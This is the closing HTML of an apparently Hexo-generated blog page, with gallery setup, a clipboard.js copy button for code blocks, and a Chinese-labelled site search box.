    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof($.fn.justifiedGallery) === 'function') {
                $('.justified-gallery').justifiedGallery();
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/o/js/script.js"></script>


    
    <div class="searchbox ins-search">
    <div class="searchbox-mask"></div>
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="站内搜索" />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: '文章',
                PAGES: '页面',
                CATEGORIES: '分类',
                TAGS: '标签',
                UNTITLED: '(无标题)',
            },
            CONTENT_URL: '/o/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>

<script src="/o/js/insight.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->

    
</body>
</html>